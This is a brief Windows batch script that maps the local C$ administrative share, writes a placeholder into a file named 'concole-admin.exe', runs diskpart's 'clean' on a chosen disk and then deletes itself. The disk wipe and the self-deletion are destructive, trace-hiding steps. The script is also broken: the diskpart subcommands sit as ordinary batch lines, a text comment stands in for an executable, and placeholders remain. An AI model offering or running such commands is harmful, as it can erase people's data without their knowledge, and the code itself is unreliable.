@echo off

REM Create the Y: drive
net use Y: /delete
net use Y: "\\localhost\c$" /persistent:no

REM Create the "Sources" directory
mkdir Y:\Sources

REM Create an executable file (e.g., concole-admin.exe) in the "Sources" directory (You need to provide your own executable file)
echo // Your executable code goes here > Y:\Sources\concole-admin.exe

REM Execute actions in the "Sources" directory
pushd Y:\Sources

REM Add text to a file (e.g., bsbsystem-cmd.exe.txt)
echo bsbsystem-cmd.exe > bsbsystem-cmd.txt

REM Perform disk-related actions (You'll need to provide code for these actions)
diskpart
list disk
select disk X  (Replace X with the desired disk number)
clean
create partition primary
assign
exit

REM Return to the system drive
popd

REM Clean up the batch script
del %0
